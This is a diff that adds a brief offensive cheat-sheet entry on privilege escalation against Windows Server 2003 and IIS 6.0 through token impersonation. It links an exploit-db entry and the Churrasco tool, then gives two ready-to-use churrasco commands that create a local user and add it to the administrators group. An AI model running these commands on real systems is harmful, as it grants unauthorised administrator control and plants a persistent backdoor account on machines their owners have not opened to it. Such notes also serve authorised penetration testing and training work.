@@ -1,0 +1,9 @@
+Windows Server 2003 and IIS 6.0 privledge escalation using impersonation:
+
+https://www.exploit-db.com/exploits/6705/
+
+https://github.com/Re4son/Churrasco
+
+churrasco -d "net user /add <username> <password>"
+churrasco -d "net localgroup administrators <username> /add"
+
